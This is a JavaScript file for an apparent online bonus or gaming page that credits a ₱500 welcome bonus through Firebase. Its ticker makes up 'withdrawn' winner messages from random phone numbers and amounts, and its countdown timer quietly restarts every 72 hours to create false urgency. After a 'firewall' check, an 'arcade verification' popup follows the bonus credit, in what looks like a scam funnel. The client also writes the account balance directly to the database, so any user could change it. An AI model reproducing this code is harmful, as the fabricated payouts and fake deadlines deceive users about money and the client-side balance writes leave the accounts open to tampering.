/**
 * PlayBonus.js - FIXED
 * - CLAIM BONUS credits +₱500 to balance ✅
 * - Auto popup after 3s (fresh) / 5s (claimed)
 * - CLAIM NOW doesn't open popup (auto popup lang)
 */

(function() {
    'use strict';
    
    // ========== GLOBAL VARIABLES ==========
    var userPhone = null;
    var db = null;
    var userRef = null;
    var currentBalance = 0;
    var bonusAmount = 500;
    var isClaimed = false;
    var claimInProgress = false;
    var autoPopupTimer = null;
    var balanceListener = null;
    var claimListener = null;
    
    var soundCache = {
        scatter: null,
        claim: null,
        success: null
    };
    
    // ========== FORMAT NUMBER ==========
    function formatNumberWithComma(number) {
        var num = Number(number).toFixed(2);
        var parts = num.split('.');
        var wholePart = parts[0];
        var decimalPart = parts[1];
        var wholeWithCommas = wholePart.replace(/\B(?=(\d{3})+(?!\d))/g, ',');
        return wholeWithCommas + '.' + decimalPart;
    }
    
    // ========== INIT SOUNDS ==========
    function initSounds() {
        try {
            soundCache.scatter = new Audio('sounds/super_ace_scatter_ring.mp3');
            soundCache.claim = new Audio('sounds/claim.wav');
            soundCache.success = new Audio('sounds/success.wav');
            soundCache.scatter.volume = 0.5;
            soundCache.claim.volume = 0.7;
            soundCache.success.volume = 0.6;
        } catch(e) {}
    }
    
    function playSound(soundName) {
        if (soundCache[soundName]) {
            soundCache[soundName].currentTime = 0;
            soundCache[soundName].play().catch(function(e) {});
        }
    }
    
    // ========== INIT ==========
    function init() {
        console.log('🎁 PlayBonus Starting...');
        
        userPhone = localStorage.getItem("userPhone");
        if (!userPhone) {
            window.location.href = "index.html";
            return;
        }
        
        var phoneDisplay = document.getElementById('userPhoneDisplay');
        if (phoneDisplay) {
            phoneDisplay.innerText = userPhone.substring(0, 4) + "***" + userPhone.substring(7, 11);
        }
        
        initSounds();
        initFirebase();
        loadUserData();
        initTimer();
        initTicker();
        initClaimFlow();
        initConfetti();
        attachButtonEvents();
        
        console.log('✅ PlayBonus ready!');
    }
    
    // ========== INIT FIREBASE ==========
    function initFirebase() {
        if (typeof firebaseConfig === 'undefined') {
            console.error('❌ Firebase config not found!');
            return;
        }
        try {
            if (!firebase.apps || !firebase.apps.length) {
                firebase.initializeApp(firebaseConfig);
            }
            db = firebase.database();
            userRef = db.ref('user_sessions/' + userPhone);
            console.log('✅ Firebase connected:', userPhone);
        } catch(e) { 
            console.error('Firebase error:', e); 
        }
    }
    
    // ========== LOAD USER DATA ==========
    function loadUserData() {
        if (!userRef) return;
        
        // Initial load from Firebase
        userRef.once('value', function(snapshot) {
            var data = snapshot.val();
            
            if (data) {
                currentBalance = Number(data.balance) || 0;
                isClaimed = data.claimed_ptcat === true;
                
                console.log('📊 Loaded - Balance: ₱' + currentBalance + ', Claimed:', isClaimed);
                
                updateBalanceDisplay();
                updateClaimButtonUI();
                scheduleAutoPopup();
            } else {
                // New user
                console.log('🆕 New user');
                currentBalance = 0;
                isClaimed = false;
                
                userRef.set({
                    phone: userPhone,
                    balance: 0,
                    claimed_ptcat: false,
                    status: "active",
                    created_at: Date.now()
                }).then(function() {
                    updateBalanceDisplay();
                    updateClaimButtonUI();
                    scheduleAutoPopup();
                });
            }
        }).catch(function(e) {
            console.error('Load error:', e);
        });
        
        // ========== REAL-TIME BALANCE LISTENER (CRITICAL!) ==========
        if (balanceListener) {
            userRef.child('balance').off('value', balanceListener);
        }
        
        balanceListener = userRef.child('balance').on('value', function(snapshot) {
            var balance = snapshot.val();
            if (balance !== null && balance !== undefined) {
                currentBalance = Number(balance);
                console.log('💰 Balance updated: ₱' + currentBalance);
                updateBalanceDisplay();
            }
        });
        
        // ========== REAL-TIME CLAIM LISTENER ==========
        if (claimListener) {
            userRef.child('claimed_ptcat').off('value', claimListener);
        }
        
        claimListener = userRef.child('claimed_ptcat').on('value', function(snapshot) {
            var claimed = snapshot.val();
            var newState = (claimed === true);
            
            if (newState !== isClaimed) {
                isClaimed = newState;
                console.log('🔄 Claim state changed:', isClaimed);
                updateClaimButtonUI();
            }
        });
    }
    
    // ========== AUTO POPUP ==========
    function scheduleAutoPopup() {
        if (autoPopupTimer) clearTimeout(autoPopupTimer);
        
        var delay = isClaimed ? 5000 : 3000;
        console.log('⏰ Auto popup in ' + (delay / 1000) + 's');
        
        autoPopupTimer = setTimeout(function() {
            autoShowBonusPopup();
        }, delay);
    }
    
    function autoShowBonusPopup() {
        console.log('🎁 Auto-showing popup (isClaimed:', isClaimed + ')');
        
        var popup = document.getElementById('bonusRewardPopup');
        if (!popup) return;
        
        popup.style.display = 'flex';
        playSound('scatter');
        updateClaimButtonUI();
    }
    
    // ========== UPDATE BALANCE DISPLAY ==========
    function updateBalanceDisplay() {
        var balanceEl = document.getElementById('userBalanceDisplay');
        if (balanceEl) {
            balanceEl.innerText = formatNumberWithComma(currentBalance);
            console.log('💵 Display: ₱' + formatNumberWithComma(currentBalance));
        }
    }
    
    // ========== ADD TO BALANCE (FIXED) ==========
    function animateBalanceThenSave(oldBalance, newBalance, callback) {
        var startTime = null;
        var duration = 1500;
        
        function step(timestamp) {
            if (!startTime) startTime = timestamp;
            var progress = Math.min((timestamp - startTime) / duration, 1);
            var easeProgress = 1 - Math.pow(1 - progress, 3);
            var val = Math.floor(easeProgress * (newBalance - oldBalance) + oldBalance);
            
            var balanceEl = document.getElementById('userBalanceDisplay');
            if (balanceEl) {
                balanceEl.innerText = formatNumberWithComma(val);
            }
            
            if (progress < 1) {
                requestAnimationFrame(step);
            } else {
                if (callback) callback();
            }
        }
        
        requestAnimationFrame(step);
    }
    
    // ========== CHECK FIREWALL ==========
    function checkFirewallBeforeClaim() {
        try {
            return db.ref('admin/globalFirewall').once('value').then(function(snapshot) {
                var data = snapshot.val();
                return (data && data.active === true);
            });
        } catch(e) {
            return Promise.resolve(false);
        }
    }
    
    // ========== TRACK CLAIM ==========
    function trackClaimInFirebase(amount) {
        try {
            var now = new Date();
            var year = now.getFullYear();
            var month = String(now.getMonth() + 1).padStart(2, '0');
            var day = String(now.getDate()).padStart(2, '0');
            var dateKey = year + '-' + month + '-' + day;
            
            var dayRef = db.ref('festival_stats/daily/' + dateKey);
            
            dayRef.transaction(function(data) {
                if (data === null) {
                    data = { claims_count: 0, claims_amount: 0, redemption_count: 0, redemption_amount: 0 };
                }
                data.claims_count = (data.claims_count || 0) + 1;
                data.claims_amount = (data.claims_amount || 0) + (amount || 0);
                data.last_update = Date.now();
                return data;
            });
            
            console.log('📊 Tracked:', dateKey, '₱' + amount);
        } catch(e) {
            console.error('Track error:', e);
        }
    }
    
    // ========== INIT CLAIM FLOW ==========
    function initClaimFlow() {
        console.log('🎁 Init Claim Flow...');
        
        var claimNowBtn = document.getElementById('claimNowBtn');
        var popup = document.getElementById('bonusRewardPopup');
        
        // ========== CLAIM NOW BUTTON (Main Page) ==========
        // ✅ HUWAG MAG-POPUP DITO - Auto popup lang after 3s
        if (claimNowBtn) {
            claimNowBtn.addEventListener('click', function(e) {
                e.preventDefault();
                e.stopPropagation();
                
                console.log('🖱️ CLAIM NOW clicked (isClaimed:', isClaimed + ')');
                
                playSound('scatter');
                
                // ✅ SHOW MESSAGE ONLY - Hindi mag-popup
                if (isClaimed) {
                    alert("You have already claimed your welcome bonus!");
                } else {
                    alert("Bonus popup will appear automatically in a moment!");
                    // Optionally reset timer para lalabas ulit after 3s
                    if (autoPopupTimer) clearTimeout(autoPopupTimer);
                    autoPopupTimer = setTimeout(function() {
                        autoShowBonusPopup();
                    }, 3000);
                }
            });
        }
        
        // ========== CLAIM BONUS BUTTON (Inside Popup) ==========
        var ptCatClaimBtn = document.getElementById('ptCatClaimBtn');
        if (ptCatClaimBtn) {
            ptCatClaimBtn.addEventListener('click', handleClaimBonus);
        }
        
        // ========== POPUP CLOSE BUTTONS ==========
        var closeBtn = document.getElementById('bonusRewardClose');
        if (closeBtn) {
            closeBtn.addEventListener('click', function() {
                if (popup) popup.style.display = 'none';
            });
        }
        
        var backBtn = document.getElementById('bonusRewardBack');
        if (backBtn) {
            backBtn.addEventListener('click', function() {
                if (popup) popup.style.display = 'none';
            });
        }
        
        updateClaimButtonUI();
        console.log('✅ Claim Flow ready');
    }
    
    // ========== HANDLE CLAIM BONUS (FIXED) ==========
    function handleClaimBonus(e) {
        e.preventDefault();
        e.stopPropagation();
        
        console.log('🖱️ CLAIM BONUS clicked (isClaimed:', isClaimed + ')');
        
        if (isClaimed) {
            alert("You have already claimed this bonus!");
            return;
        }
        
        if (claimInProgress) {
            alert("Please wait, processing...");
            return;
        }
        
        if (!userRef) {
            alert("System not ready. Please refresh.");
            return;
        }
        
        // Double-check from Firebase
        userRef.child('claimed_ptcat').once('value', function(snapshot) {
            if (snapshot.val() === true) {
                isClaimed = true;
                updateClaimButtonUI();
                alert("You have already claimed this bonus!");
                return;
            }
            processClaim();
        }).catch(function(error) {
            console.error('Check error:', error);
            processClaim();
        });
    }
    
    // ========== PROCESS CLAIM (CREDIT +500) ==========
    function processClaim() {
        claimInProgress = true;
        
        var ptCatClaimBtn = document.getElementById('ptCatClaimBtn');
        
        if (ptCatClaimBtn) {
            ptCatClaimBtn.disabled = true;
            ptCatClaimBtn.style.opacity = '0.6';
            ptCatClaimBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> <span>PROCESSING...</span>';
        }
        
        // Check firewall
        checkFirewallBeforeClaim().then(function(firewallOn) {
            if (firewallOn) {
                console.log('🔥 Firewall ON - Show arcade verification');
                
                // Hide bonus popup
                var popup = document.getElementById('bonusRewardPopup');
                if (popup) popup.style.display = 'none';
                
                // ✅ CREDIT BALANCE + MARK CLAIMED FIRST
                creditBonusAndMark(function() {
                    // Show Arcade popup AFTER credit
                    if (window.showPopup) {
                        window.showPopup(currentBalance);
                    }
                    claimInProgress = false;
                });
            } else {
                console.log('🔓 Firewall OFF - Direct claim');
                
                creditBonusAndMark(function() {
                    var popup = document.getElementById('bonusRewardPopup');
                    if (popup) popup.style.display = 'none';
                    
                    setTimeout(function() {
                        showSuccessPopup(bonusAmount);
                    }, 300);
                    
                    claimInProgress = false;
                });
            }
        }).catch(function(error) {
            console.error('Firewall error:', error);
            claimInProgress = false;
            resetClaimButton();
        });
    }
    
    // ========== ✅ CREDIT BONUS + MARK CLAIMED (ATOMIC) ==========
    function creditBonusAndMark(callback) {
        console.log('💰 Crediting ₱' + bonusAmount + ' to balance...');
        
        var oldBalance = currentBalance;
        var newBalance = oldBalance + bonusAmount;
        
        console.log('   Old: ₱' + oldBalance);
        console.log('   New: ₱' + newBalance);
        
        // ✅ ATOMIC UPDATE - Both balance AND claimed in one transaction
        userRef.update({
            balance: newBalance,
            claimed_ptcat: true,
            ptcat_claimed_at: Date.now(),
            lastUpdate: Date.now()
        }).then(function() {
            console.log('✅ Firebase updated! New balance: ₱' + newBalance);
            
            // Update local state
            currentBalance = newBalance;
            isClaimed = true;
            
            // ✅ Animate balance (count-up)
            animateBalanceThenSave(oldBalance, newBalance, function() {
                updateBalanceDisplay();
            });
            
            // Track claim in stats
            trackClaimInFirebase(bonusAmount);
            
            // Play sound
            playSound('claim');
            
            // Confetti
            startConfetti();
            
            // Update button
            updateClaimButtonUI();
            
            if (callback) callback();
            
        }).catch(function(error) {
            console.error('❌ Firebase update error:', error);
            alert('Error saving claim. Please try again.');
            claimInProgress = false;
            resetClaimButton();
        });
    }
    
    // ========== RESET CLAIM BUTTON ==========
    function resetClaimButton() {
        var ptCatClaimBtn = document.getElementById('ptCatClaimBtn');
        if (ptCatClaimBtn) {
            ptCatClaimBtn.disabled = false;
            ptCatClaimBtn.style.opacity = '1';
            ptCatClaimBtn.innerHTML = '<i class="fas fa-gift"></i> <span>CLAIM BONUS</span>';
        }
        claimInProgress = false;
    }
    
    // ========== UPDATE CLAIM BUTTON UI ==========
    function updateClaimButtonUI() {
        var ptCatClaimBtn = document.getElementById('ptCatClaimBtn');
        var bonusLabel = document.querySelector('.bonus-label');
        
        if (!ptCatClaimBtn) return;
        
        if (isClaimed) {
            ptCatClaimBtn.disabled = true;
            ptCatClaimBtn.style.opacity = '0.5';
            ptCatClaimBtn.style.cursor = 'not-allowed';
            ptCatClaimBtn.style.pointerEvents = 'none';
            ptCatClaimBtn.innerHTML = '<i class="fas fa-check-circle"></i> <span>ALREADY CLAIMED</span>';
            ptCatClaimBtn.classList.add('claimed');
            
            if (bonusLabel) {
                bonusLabel.textContent = 'BONUS CLAIMED';
                bonusLabel.style.color = '#39ff14';
            }
            
            console.log('🔒 UI: ALREADY CLAIMED');
        } else {
            ptCatClaimBtn.disabled = false;
            ptCatClaimBtn.style.opacity = '1';
            ptCatClaimBtn.style.cursor = 'pointer';
            ptCatClaimBtn.style.pointerEvents = 'auto';
            ptCatClaimBtn.innerHTML = '<i class="fas fa-gift"></i> <span>CLAIM BONUS</span>';
            ptCatClaimBtn.classList.remove('claimed');
            
            if (bonusLabel) {
                bonusLabel.textContent = 'BONUS REWARD';
                bonusLabel.style.color = '';
            }
            
            console.log('🔓 UI: CLAIM BONUS available');
        }
    }
    
    // ========== SUCCESS POPUP ==========
    function showSuccessPopup(amount) {
        var popup = document.getElementById('successPopup');
        var amountEl = document.getElementById('successAmount');
        var closeBtn = document.getElementById('successCloseBtn');
        
        if (amountEl) amountEl.textContent = amount;
        if (popup) popup.style.display = 'flex';
        
        playSound('success');
        
        if (closeBtn) {
            closeBtn.onclick = function() {
                popup.style.display = 'none';
            };
        }
        
        setTimeout(function() {
            if (popup) popup.style.display = 'none';
        }, 5000);
    }
    
    // ========== TIMER ==========
    function initTimer() {
        var displayElement = document.getElementById('mainTimerDisplay');
        if (!displayElement) return;
        
        var CYCLE_HOURS = 72;
        var timerEndDate = null;
        
        try {
            var savedEnd = localStorage.getItem('timerEndDate');
            var now = Date.now();
            
            if (savedEnd && parseInt(savedEnd) > now) {
                timerEndDate = parseInt(savedEnd);
            } else {
                timerEndDate = now + (CYCLE_HOURS * 60 * 60 * 1000);
                localStorage.setItem('timerEndDate', timerEndDate);
            }
            
            function update() {
                var now = Date.now();
                var diff = timerEndDate - now;
                
                if (diff <= 0) {
                    timerEndDate = now + (CYCLE_HOURS * 60 * 60 * 1000);
                    localStorage.setItem('timerEndDate', timerEndDate);
                    diff = CYCLE_HOURS * 60 * 60 * 1000;
                }
                
                var days = Math.floor(diff / (1000 * 60 * 60 * 24));
                var hours = Math.floor((diff / (1000 * 60 * 60)) % 24);
                var minutes = Math.floor((diff / (1000 * 60)) % 60);
                var seconds = Math.floor((diff / 1000) % 60);
                
                displayElement.innerHTML = days + 'D ' +
                    hours.toString().padStart(2, '0') + ':' +
                    minutes.toString().padStart(2, '0') + ':' +
                    seconds.toString().padStart(2, '0');
            }
            
            update();
            setInterval(update, 1000);
        } catch(e) {
            console.error('Timer error:', e);
        }
    }
    
    // ========== TICKER ==========
    function initTicker() {
        var winnerSpan = document.getElementById('winnerText');
        if (!winnerSpan) return;
        
        var prefixes = ["0917", "0918", "0927", "0998", "0945", "0966", "0955", "0939", "0906", "0977"];
        
        var amountRarity = [
            { amount: 500, weight: 85 },
            { amount: 1000, weight: 10 },
            { amount: 2000, weight: 3 },
            { amount: 2500, weight: 2 }
        ];
        
        function generateRandomAmount() {
            var totalWeight = 0;
            for (var i = 0; i < amountRarity.length; i++) totalWeight += amountRarity[i].weight;
            var random = Math.random() * totalWeight;
            var cumulative = 0;
            for (var i = 0; i < amountRarity.length; i++) {
                cumulative += amountRarity[i].weight;
                if (random <= cumulative) return amountRarity[i].amount;
            }
            return 500;
        }
        
        function updateTicker() {
            var prefix = prefixes[Math.floor(Math.random() * prefixes.length)];
            var last4 = Math.floor(1000 + Math.random() * 9000);
            var amount = generateRandomAmount();
            winnerSpan.innerHTML = prefix + '***' + last4 + ' withdrawn <img src="images/gc_icon.png" class="gc-winner-icon"> ₱' + amount.toLocaleString();
        }
        
        updateTicker();
        setInterval(updateTicker, 4800);
    }
    
    // ========== CONFETTI ==========
    var confettiCanvas = null;
    var confettiAnimation = null;
    
    function initConfetti() {
        confettiCanvas = document.getElementById('confettiCanvas');
    }
    
    function startConfetti() {
        if (!confettiCanvas) return;
        
        confettiCanvas.style.display = 'block';
        confettiCanvas.width = window.innerWidth;
        confettiCanvas.height = window.innerHeight;
        
        var ctx = confettiCanvas.getContext('2d');
        var particles = [];
        
        for (var i = 0; i < 150; i++) {
            particles.push({
                x: Math.random() * confettiCanvas.width,
                y: Math.random() * confettiCanvas.height - confettiCanvas.height,
                size: Math.random() * 8 + 3,
                color: 'hsl(' + (Math.random() * 360) + ', 100%, 60%)',
                speed: Math.random() * 4 + 2,
                rotation: Math.random() * 360,
                rotationSpeed: (Math.random() - 0.5) * 10
            });
        }
        
        function draw() {
            if (!confettiCanvas || confettiCanvas.style.display === 'none') return;
            ctx.clearRect(0, 0, confettiCanvas.width, confettiCanvas.height);
            
            for (var i = 0; i < particles.length; i++) {
                var p = particles[i];
                ctx.save();
                ctx.translate(p.x, p.y);
                ctx.rotate(p.rotation * Math.PI / 180);
                ctx.fillStyle = p.color;
                ctx.fillRect(-p.size/2, -p.size/2, p.size, p.size);
                ctx.restore();
                
                p.y += p.speed;
                p.rotation += p.rotationSpeed;
                
                if (p.y > confettiCanvas.height) {
                    p.y = -p.size;
                    p.x = Math.random() * confettiCanvas.width;
                }
            }
            confettiAnimation = requestAnimationFrame(draw);
        }
        
        draw();
        
        setTimeout(function() {
            if (confettiAnimation) cancelAnimationFrame(confettiAnimation);
            ctx.clearRect(0, 0, confettiCanvas.width, confettiCanvas.height);
            confettiCanvas.style.display = 'none';
        }, 4000);
    }
    
    // ========== ATTACH BUTTON EVENTS ==========
    function attachButtonEvents() {
        var logoutBtn = document.getElementById('logoutBtn');
        if (logoutBtn) {
            logoutBtn.addEventListener('click', function() {
                logoutUser();
            });
        }
        
        var fbBtn = document.getElementById('facebookShareBtn');
        if (fbBtn) {
            fbBtn.addEventListener('click', function() {
                shareOnFacebook();
            });
        }
    }
    
    // ========== LOGOUT ==========
    function logoutUser() {
        if (userPhone) {
            try {
                db.ref('user_sessions/' + userPhone).update({
                    status: 'offline',
                    lastSeen: firebase.database.ServerValue.TIMESTAMP
                });
            } catch(e) {}
        }
        localStorage.clear();
        sessionStorage.clear();
        window.location.replace('index.html');
    }
    
    // ========== FACEBOOK SHARE ==========
    function shareOnFacebook() {
        var shareUrl = 'https://tiny.cc/LuckyDrop';
        window.open('https://www.facebook.com/sharer/sharer.php?u=' + encodeURIComponent(shareUrl), '_blank', 'width=600,height=400');
    }
    
    // ========== BAN CHECK ==========
    function checkIfBanned() {
        if (!userPhone) return;
        try {
            db.ref('banned_ghosts/' + userPhone).once('value').then(function(snap) {
                if (snap.exists()) {
                    db.ref('user_sessions/' + userPhone).update({ status: 'offline' });
                    localStorage.clear();
                    sessionStorage.clear();
                    window.location.replace('index.html');
                }
            });
        } catch(e) {}
    }
    
    // ========== EXPORT ==========
    window.PlayBonus = {
        playSound: playSound,
        formatNumberWithComma: formatNumberWithComma,
        getBalance: function() { return currentBalance; },
        getUserPhone: function() { return userPhone; },
        isUserClaimed: function() { return isClaimed; }
    };
    
    // ========== START ==========
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', function() {
            init();
            setInterval(checkIfBanned, 5000);
            checkIfBanned();
        });
    } else {
        init();
        setInterval(checkIfBanned, 5000);
        checkIfBanned();
    }
    
})();
